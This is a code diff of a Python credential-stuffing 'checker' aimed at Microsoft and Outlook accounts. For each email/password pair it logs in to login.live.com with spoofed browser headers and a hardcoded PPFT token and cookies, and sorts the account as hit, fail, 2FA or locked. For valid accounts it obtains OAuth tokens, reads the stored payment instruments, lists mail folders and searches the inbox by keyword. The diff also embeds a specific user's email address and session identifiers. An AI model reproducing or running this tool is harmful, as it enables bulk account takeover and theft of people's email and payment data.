@@ -94,8 +94,27 @@ def _check_single(email, password, search_keyword=None):
     return result
 
 
+LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
+
+LOGIN_HEADERS = {
+    "Host": "login.live.com", "Connection": "keep-alive", "Cache-Control": "max-age=0",
+    "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+    "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+    "Upgrade-Insecure-Requests": "1", "Origin": "https://login.live.com",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": USER_AGENT,
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
+    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Cookie": "MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89",
+    "Accept-Encoding": "gzip, deflate",
+}
+
+
 def _attempt_check(email, password, search_keyword=None):
-    """Single attempt to check an account."""
+    """Single attempt to check an account — same login flow as checker.py."""
     result = {
         "user": email,
         "password": password,
@@ -105,201 +124,116 @@ def _attempt_check(email, password, search_keyword=None):
     }
 
     session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
     session.max_redirects = 8
 
     try:
-        # ── Step 0: GET login page to extract fresh PPFT + cookies ──
-        auth_url = (
-            "https://login.live.com/oauth20_authorize.srf?"
-            "client_id=0000000048170EF2"
-            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
-            "&response_type=token"
-            "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
-            "&display=touch"
-            f"&username={urllib.parse.quote(email)}"
-        )
-
-        pre_resp = session.get(auth_url, headers={
-            "User-Agent": USER_AGENT,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate",
-        }, timeout=20)
-
-        pre_body = pre_resp.text
-
-        # Extract PPFT token
-        ppft = _parse_lr(pre_body, 'name="PPFT" id="i0327" value="', '"')
-        if not ppft:
-            ppft = _parse_lr(pre_body, "sFT:'", "'")
-        if not ppft:
-            ppft = _parse_lr(pre_body, 'sFT:"', '"')
-        if not ppft:
-            result["status"] = "retry"
-            result["detail"] = "no PPFT token"
-            return result
-
-        # Extract urlPost (the actual POST target)
-        url_post = _parse_lr(pre_body, "urlPost:'", "'")
-        if not url_post:
-            url_post = _parse_lr(pre_body, 'urlPost:"', '"')
-        if not url_post:
-            url_post = (
-                "https://login.live.com/ppsecure/post.srf?"
-                "client_id=0000000048170EF2"
-                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
-                "&response_type=token"
-                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
-                "&display=touch"
-                f"&username={urllib.parse.quote(email)}"
-            )
-
-        # ── Step 1: Login POST with fresh PPFT ──
+        # ── Step 1: Direct POST login (same as checker.py — proven working) ──
         post_data = (
-            "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
-            "&hpgrequestid="
-            f"&PPFT={urllib.parse.quote(ppft)}"
-            "&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
+            "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
+            "&PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
+            "&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
             "&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
-            f"&login={urllib.parse.quote(email)}"
-            f"&loginfmt={urllib.parse.quote(email)}"
-            "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
+            f"&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
+            f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
             f"&passwd={urllib.parse.quote(password)}"
         )
 
-        login_headers = {
-            "Origin": "https://login.live.com",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "Referer": "https://login.live.com/oauth20_authorize.srf",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate",
-        }
-
-        resp = session.post(url_post, data=post_data, headers=login_headers,
-                            allow_redirects=True, timeout=30)
+        resp = session.post(LOGIN_URL, headers=LOGIN_HEADERS, data=post_data,
+                            allow_redirects=True, timeout=15)
 
         body = resp.text
         final_url = str(resp.url)
 
-        # ── Collect ALL cookies from session + response ──
-        all_cookies = {}
-        for c in session.cookies:
-            all_cookies[c.name] = c.value
-        for c in resp.cookies:
-            all_cookies[c.name] = c.value
-        all_cookies_str = str(all_cookies)
+        # ── Status check (same logic as checker.py) ──
+        cookies_dict = session.cookies.get_dict()
+        cookies_str = str(cookies_dict)
 
-        # Also check redirect history cookies
-        for hist_resp in resp.history:
-            for c in hist_resp.cookies:
-                all_cookies[c.name] = c.value
-                all_cookies_str = str(all_cookies)
-
-        # ── Key checks (exact .svb order) ──
-
-        # Failure check
-        is_bad_pass = "Your account or password is incorrect" in body
-        is_no_account = "doesn\\'t exist" in body or "doesn't exist" in body
-        is_sign_in_page = "Sign in to your Microsoft account" in body
-
-        if is_bad_pass or is_no_account:
+        # Failure
+        if any(x in body for x in [
+            "Your account or password is incorrect",
+            "That Microsoft account doesn\\'t exist",
+            "That Microsoft account doesn't exist",
+            "Sign in to your Microsoft account",
+            "timed out"
+        ]):
             result["status"] = "fail"
             result["detail"] = "bad credentials"
             return result
 
-        # Ban check
+        # Ban
         if ",AC:null,urlFedConvertRename" in body:
             result["status"] = "retry"
             result["detail"] = "ban/rate limit"
             return result
 
-        # Sign-in page without valid cookies = failure
-        if is_sign_in_page and "ANON" not in all_cookies_str and "WLSSC" not in all_cookies_str:
-            result["status"] = "fail"
-            result["detail"] = "bad credentials"
-            return result
-
-        # Success check — match ANY of these (OR logic like .svb)
-        has_anon = "ANON" in all_cookies_str
-        has_wlssc = "WLSSC" in all_cookies_str
-        has_desktop = "oauth20_desktop.srf?" in final_url
-
-        if not (has_anon or has_wlssc or has_desktop):
-            # Not success yet — check 2FA/custom BEFORE marking fail
-            pass
-
-        # 2FA check
-        if "account.live.com/recover?mkt" in body or \
-           "recover?mkt" in body or \
-           "account.live.com/identity/confirm?mkt" in body or \
-           "Email/Confirm?mkt" in body:
+        # 2FA
+        if any(x in body for x in [
+            "account.live.com/recover?mkt", "recover?mkt",
+            "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"
+        ]):
             result["status"] = "2fa"
-            result["detail"] = "2FA/recovery required"
+            result["detail"] = "2FA/recovery"
             return result
 
-        # Custom checks
-        if "/cancel?mkt=" in body:
+        # Custom/Locked
+        if "/cancel?mkt=" in body or "/Abuse?mkt=" in body:
             result["status"] = "custom"
-            result["detail"] = "cancel prompt"
+            result["detail"] = "locked/abuse"
             return result
 
-        if "/Abuse?mkt=" in body:
-            result["status"] = "custom"
-            result["detail"] = "abuse flag"
-            return result
-
-        # Final success gate
-        if not (has_anon or has_wlssc or has_desktop):
+        # Success check (same as checker.py)
+        if ("ANON" in cookies_str or "WLSSC" in cookies_str) and \
+           "https://login.live.com/oauth20_desktop.srf?" in final_url:
+            result["status"] = "hit"
+        else:
             result["status"] = "fail"
             result["detail"] = "login failed"
             return result
 
-        result["status"] = "hit"
-
-        # ── Step 2: Extract refresh token from final URL ──
-        refresh_token = ""
-        if "refresh_token=" in final_url:
-            refresh_token = _parse_lr(final_url, "refresh_token=", "&")
-        if not refresh_token and "refresh_token=" in body:
-            refresh_token = _parse_lr(body, "refresh_token=", "&")
-        # Also check redirect history URLs
-        if not refresh_token:
-            for hist_resp in resp.history:
-                hist_url = str(hist_resp.url)
-                if "refresh_token=" in hist_url:
-                    refresh_token = _parse_lr(hist_url, "refresh_token=", "&")
-                    break
-            # Check Location headers too
-            if not refresh_token:
-                for hist_resp in resp.history:
-                    loc = hist_resp.headers.get("Location", "")
-                    if "refresh_token=" in loc:
-                        refresh_token = _parse_lr(loc, "refresh_token=", "&")
-                        break
-
-        if not refresh_token:
-            result["detail"] = "logged in, no refresh token"
-            return result
-
-        # ── Step 3: Exchange for substrate access token (with retry) ──
-        access_token = ""
-        for token_attempt in range(2):
-            token_data = (
-                "grant_type=refresh_token"
-                "&client_id=0000000048170EF2"
-                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
-                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
-                f"&refresh_token={refresh_token}"
-                "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
+        # ── Step 2: Get PIFD token (same as checker.py) ──
+        pifd_token = ""
+        try:
+            r2 = session.get(
+                "https://login.live.com/oauth20_authorize.srf?"
+                "client_id=000000000004773A&response_type=token"
+                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
+                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
+                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
+                "&prompt=none",
+                headers={
+                    "Host": "login.live.com",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Connection": "close",
+                    "Referer": "https://account.microsoft.com/",
+                },
+                allow_redirects=True, timeout=15,
             )
+            pifd_token = _parse_lr(str(r2.url), "access_token=", "&token_type")
+            if not pifd_token:
+                pifd_token = _parse_lr(str(r2.url), "access_token=", "&")
+            if pifd_token:
+                pifd_token = urllib.parse.unquote(pifd_token)
+        except Exception:
+            pass
 
+        # ── Step 3: Get substrate access token via refresh_token ──
+        access_token = ""
+        refresh_token = _parse_lr(final_url, "refresh_token=", "&")
+        if not refresh_token:
+            refresh_token = _parse_lr(body, "refresh_token=", "&")
+
+        if refresh_token:
             try:
+                token_data = (
+                    "grant_type=refresh_token"
+                    "&client_id=0000000048170EF2"
+                    "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
+                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+                    f"&refresh_token={refresh_token}"
+                    "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
+                )
                 token_resp = session.post(
                     "https://login.live.com/oauth20_token.srf",
                     data=token_data,
@@ -311,75 +245,33 @@ def _attempt_check(email, password, search_keyword=None):
                         "Connection": "Keep-Alive",
                         "Accept-Encoding": "gzip",
                     },
-                    timeout=30,
+                    timeout=15,
                 )
                 access_token = token_resp.json().get("access_token", "")
             except Exception:
-                access_token = ""
+                pass
 
-            if access_token and access_token.startswith("Ew"):
-                break
-            if token_attempt == 0:
-                time.sleep(1)
-
-        if not access_token or not access_token.startswith("Ew"):
-            result["detail"] = "token exchange failed"
-            return result
-
-        # ── Step 4: Get PIFD token for payment instruments ──
-        pifd_token = ""
-        try:
-            pifd_resp = session.get(
-                "https://login.live.com/oauth20_authorize.srf?"
-                "client_id=000000000004773A"
-                "&response_type=token"
-                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
-                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
-                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
-                "&prompt=none",
-                headers={
-                    "Host": "login.live.com",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "en-US,en;q=0.5",
-                    "Accept-Encoding": "gzip, deflate",
-                    "Connection": "close",
-                    "Referer": "https://account.microsoft.com/",
-                },
-                allow_redirects=True,
-                timeout=30,
-            )
-            pifd_url = str(pifd_resp.url)
-            if "access_token=" in pifd_url:
-                pifd_token = _parse_lr(pifd_url, "access_token=", "&token_type")
-                if not pifd_token:
-                    pifd_token = _parse_lr(pifd_url, "access_token=", "&")
-        except Exception:
-            pass
-
-        # ── Step 5: Payment instruments ──
+        # ── Step 4: Payment instruments (same headers as checker.py) ──
         if pifd_token:
             try:
+                pay_h = {
+                    "User-Agent": USER_AGENT,
+                    "Pragma": "no-cache",
+                    "Accept": "application/json",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
+                    "Content-Type": "application/json",
+                    "Origin": "https://account.microsoft.com",
+                    "Referer": "https://account.microsoft.com/",
+                    "Sec-Fetch-Dest": "empty",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Site": "same-site",
+                }
+
                 pay_resp = session.get(
                     "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
                     "?status=active,removed&language=en-US",
-                    headers={
-                        "User-Agent": USER_AGENT,
-                        "Pragma": "no-cache",
-                        "Accept": "application/json",
-                        "Accept-Encoding": "gzip, deflate, br",
-                        "Accept-Language": "en-US,en;q=0.9",
-                        "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
-                        "Connection": "keep-alive",
-                        "Content-Type": "application/json",
-                        "Host": "paymentinstruments.mp.microsoft.com",
-                        "Origin": "https://account.microsoft.com",
-                        "Referer": "https://account.microsoft.com/",
-                        "Sec-Fetch-Dest": "empty",
-                        "Sec-Fetch-Mode": "cors",
-                        "Sec-Fetch-Site": "same-site",
-                    },
-                    timeout=30,
+                    headers=pay_h, timeout=15,
                 )
 
                 pay_body = pay_resp.text
@@ -437,122 +329,111 @@ def _attempt_check(email, password, search_keyword=None):
             except Exception:
                 pass
 
-        # ── Step 6: Mail folders ──
-        try:
-            folders_resp = session.get(
-                "https://outlook.office.com/api/beta/me/MailFolders",
-                headers={
-                    "User-Agent": "Outlook-Android/2.0",
-                    "Pragma": "no-cache",
-                    "Accept": "application/json",
-                    "ForceSync": "false",
-                    "Authorization": f"Bearer {access_token}",
-                    "Host": "substrate.office.com",
-                    "Connection": "Keep-Alive",
-                    "Accept-Encoding": "gzip",
-                },
-                timeout=30,
-            )
+        # ── Step 5: Mail folders + inbox search (needs access_token) ──
+        if access_token and access_token.startswith("Ew"):
+            mail_headers = {
+                "User-Agent": "Outlook-Android/2.0",
+                "Pragma": "no-cache",
+                "Accept": "application/json",
+                "ForceSync": "false",
+                "Authorization": f"Bearer {access_token}",
+                "Host": "substrate.office.com",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip",
+            }
+
+            # Folders
             try:
+                folders_resp = session.get(
+                    "https://outlook.office.com/api/beta/me/MailFolders",
+                    headers=mail_headers, timeout=15,
+                )
                 folders_json = folders_resp.json()
-                folder_names = []
-                for f in folders_json.get("value", []):
-                    folder_names.append(f.get("DisplayName", ""))
+                folder_names = [f.get("DisplayName", "") for f in folders_json.get("value", [])]
                 if folder_names:
                     result["captures"]["Folders"] = ", ".join(folder_names[:10])
             except Exception:
                 pass
-        except Exception:
-            pass
 
-        # ── Step 7: Inbox search (service-specific keyword) ──
-        if search_keyword:
-            try:
-                search_body = {
-                    "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
-                    "Scenario": {"Name": "owa.react"},
-                    "TimeZone": "UTC",
-                    "TextDecorations": "Off",
-                    "EntityRequests": [{
-                        "EntityType": "Conversation",
-                        "ContentSources": ["Exchange"],
-                        "Filter": {
-                            "Or": [
-                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
-                                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                            ]
+            # Inbox search
+            if search_keyword:
+                try:
+                    search_body = {
+                        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
+                        "Scenario": {"Name": "owa.react"},
+                        "TimeZone": "UTC",
+                        "TextDecorations": "Off",
+                        "EntityRequests": [{
+                            "EntityType": "Conversation",
+                            "ContentSources": ["Exchange"],
+                            "Filter": {
+                                "Or": [
+                                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                                    {"Term": {"DistinguishedFolderName": "DeletedItems"}},
+                                ]
+                            },
+                            "From": 0,
+                            "Query": {"QueryString": search_keyword},
+                            "RefiningQueries": None,
+                            "Size": 25,
+                            "Sort": [
+                                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
+                                {"Field": "Time", "SortDirection": "Desc"},
+                            ],
+                            "EnableTopResults": True,
+                            "TopResultsCount": 3,
+                        }],
+                        "AnswerEntityRequests": [{
+                            "Query": {"QueryString": search_keyword},
+                            "EntityTypes": ["Event", "File"],
+                            "From": 0,
+                            "Size": 10,
+                            "EnableAsyncResolution": True,
+                        }],
+                        "QueryAlterationOptions": {
+                            "EnableSuggestion": True,
+                            "EnableAlteration": True,
+                            "SupportedRecourseDisplayTypes": [
+                                "Suggestion", "NoResultModification",
+                                "NoResultFolderRefinerModification",
+                                "NoRequeryModification", "Modification",
+                            ],
                         },
-                        "From": 0,
-                        "Query": {"QueryString": search_keyword},
-                        "RefiningQueries": None,
-                        "Size": 25,
-                        "Sort": [
-                            {"Field": "Score", "SortDirection": "Desc", "Count": 3},
-                            {"Field": "Time", "SortDirection": "Desc"},
-                        ],
-                        "EnableTopResults": True,
-                        "TopResultsCount": 3,
-                    }],
-                    "AnswerEntityRequests": [{
-                        "Query": {"QueryString": search_keyword},
-                        "EntityTypes": ["Event", "File"],
-                        "From": 0,
-                        "Size": 10,
-                        "EnableAsyncResolution": True,
-                    }],
-                    "QueryAlterationOptions": {
-                        "EnableSuggestion": True,
-                        "EnableAlteration": True,
-                        "SupportedRecourseDisplayTypes": [
-                            "Suggestion", "NoResultModification",
-                            "NoResultFolderRefinerModification",
-                            "NoRequeryModification", "Modification",
-                        ],
-                    },
-                    "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
-                }
+                        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
+                    }
 
-                search_resp = session.post(
-                    "https://outlook.live.com/search/api/v2/query?n=124",
-                    json=search_body,
-                    headers={
-                        "User-Agent": "Outlook-Android/2.0",
-                        "Pragma": "no-cache",
-                        "Accept": "application/json",
-                        "ForceSync": "false",
-                        "Authorization": f"Bearer {access_token}",
-                        "Host": "substrate.office.com",
-                        "Connection": "Keep-Alive",
-                        "Accept-Encoding": "gzip",
-                    },
-                    timeout=30,
-                )
+                    search_resp = session.post(
+                        "https://outlook.live.com/search/api/v2/query?n=124",
+                        json=search_body,
+                        headers=mail_headers,
+                        timeout=15,
+                    )
 
-                search_text = search_resp.text
+                    search_text = search_resp.text
 
-                # CAP "Total Msg From <keyword>"
-                total_msgs = _parse_lr(search_text, '"Total":', ',')
-                if not total_msgs:
-                    try:
-                        total_msgs = str(search_resp.json().get("Total", "0"))
-                    except Exception:
-                        total_msgs = "0"
-                kw_upper = search_keyword.upper()
-                result["captures"][f"Total Msg From {kw_upper}"] = total_msgs.strip()
+                    # CAP "Total Msg From <keyword>"
+                    total_msgs = _parse_lr(search_text, '"Total":', ',')
+                    if not total_msgs:
+                        try:
+                            total_msgs = str(search_resp.json().get("Total", "0"))
+                        except Exception:
+                            total_msgs = "0"
+                    kw_upper = search_keyword.upper()
+                    result["captures"][f"Total Msg From {kw_upper}"] = total_msgs.strip()
 
-                # CAP "Last MSG From Mail"
-                snippet = _parse_lr(search_text, '"HitHighlightedSummary":"', '",')
-                snippet = re.sub(r'\[.*?\]', '', snippet).strip() if snippet else ""
-                if snippet:
-                    result["captures"]["Last MSG From Mail"] = snippet[:120]
+                    # CAP "Last MSG From Mail"
+                    snippet = _parse_lr(search_text, '"HitHighlightedSummary":"', '",')
+                    snippet = re.sub(r'\[.*?\]', '', snippet).strip() if snippet else ""
+                    if snippet:
+                        result["captures"]["Last MSG From Mail"] = snippet[:120]
 
-                # CAP "Last Mail Msg" (date)
-                last_date = _parse_lr(search_text, '"LastDeliveryTime":"', 'T')
-                if last_date:
-                    result["captures"]["Last Mail Msg"] = last_date
+                    # CAP "Last Mail Msg" (date)
+                    last_date = _parse_lr(search_text, '"LastDeliveryTime":"', 'T')
+                    if last_date:
+                        result["captures"]["Last Mail Msg"] = last_date
 
-            except Exception:
-                pass
+                except Exception:
+                    pass
 
     except requests.exceptions.Timeout:
         result["status"] = "retry"
